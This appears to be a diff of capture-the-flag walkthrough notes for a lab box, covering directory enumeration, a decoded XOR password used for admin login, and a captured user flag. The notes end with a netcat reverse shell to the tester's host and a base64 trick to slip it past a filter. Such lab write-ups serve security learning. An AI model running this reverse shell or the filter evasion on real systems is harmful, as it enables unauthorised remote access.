@@ -23,13 +23,83 @@
   
 2. Web Application Analysis: 
 
-    A. dirb http://10.10.30.59 /usr/share/dirb/wordlists/common.txt
+    A. dirb http://10.10.30.59 
 
        Results:
           http://10.10.30.59/cgi-bin/  (CODE:403|SIZE:199)
 
+    B. go to website
+          A. http://10.10.30.59/cgi-bin/
+
+          B. go to certificate
+
+          C. DNS: earth.local & terratest.earth.local
+
+    C. go to website with DNS
+          A. https://10.10.30.59/earth.local
+          B. https://10.10.30.59/terratest.earth.local
+
+    D. dirb https://earth.local
+
+       Results:
+          https://earth.local/admin  (CODE:301|SIZE:0)
+          https://earth.local/cgi-bin/  (CODE:403|SIZE:199)
+
+    E. dirb https:terratest.earth.local
+
+       Results:
+          https://terratest.earth.local/cgi-bin/  (CODE:403|SIZE:199)
+          https://terratest.earth.local/index.html  (CODE:200|SIZE:26)
+          https://terratest.earth.local/robots.txt  (CODE:200|SIZE:521)
+
+    F. go to https://terratest.earth.local/robots.txt
+
+        Results:
+          testingnotes*
+
+    G. go to https://terratest.earth.local/testingnotes.txt
+
+        Results:
+          username: terra
+          encryption: XOR
+          
+
+          other: testdata.txt
+          go to https://terratest.earth.local/testdata.txt
 
 
+    H. go to cyberchef
+
+        From: hex
+        XOR:UTF8
+
+        pword: earthclimatechangebad4humans
+
+    I. log in 
+
+        https://earth.local/admin
+
+        user: terry
+        pword: earthclimatechangebad4humans
+
+        ls /var/earth_web/user_flag.txt
+
+    Flag 1:
+
+      user_flag_3353b67d6437f07ba7d34afd7d2fc27d
 
 
+                                    ##### FLAG 2 #####
+
+    A. setup netcat 
+      
+        nc -lvnp 4444 (local machine)
+        nc -e /bin/bash 10.10.1.50 4444 (received error : remote connections are forbidden)
+
+        hide execution in hash
+        echo 'nc -e bin/bash 10.10.1.50 4444' | base64
+
+        new cli
+        echo 'nc -e skhfsafhsdkjlhfksjdhgkjah' | base64 -d | bash
+        
 
